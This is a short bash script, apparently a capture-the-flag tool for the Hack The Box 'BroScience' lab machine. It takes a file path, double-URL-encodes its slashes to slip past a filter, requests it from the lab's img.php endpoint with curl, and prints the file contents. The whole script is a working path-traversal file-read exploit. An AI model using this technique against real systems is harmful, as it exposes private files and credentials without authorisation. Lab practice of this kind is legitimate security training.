#!/bin/bash

# Define colors
BLACK='\033[0;30m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
GRAY='\033[1;30m'
LIGHT_GRAY='\033[1;37m'
ORANGE='\033[0;38;5;208m'
GRAY_BLUE='\033[0;38;5;240m'
NC='\033[0m' # No Color

echo  -e " ${GREEN}  ____            _____      _                      "
echo  -e " ${GREEN} |  _ \          / ____|    (_)                     "
echo  -e " ${GREEN} | |_) |_ __ ___| (___   ___ _  ___ _ __   ___ ___  "
echo  -e " ${GREEN} |  _ <| '__/ _ \\___ \ / __| |/ _ \ '_ \ / __/ _ \ "
echo  -e " ${GREEN} | |_) | | | (_) |___) | (__| |  __/ | | | (_|  __/ "
echo  -e " ${GREEN} |____/|_|  \___/_____/ \___|_|\___|_| |_|\___\___| ${NC}"
                     
# Print banner
echo -e "${YELLOW}By: César Arias (SxZkD)${NC}"

# Prompt for path input
read -p "Enter the path: " path

# Construct URL with path input
url="https://broscience.htb/includes/img.php?path=${path//\//%252f}"



# Send request to URL and store response in variable
ans=$(curl -sk "$url")

echo -e "${RED}$ans${NC}"


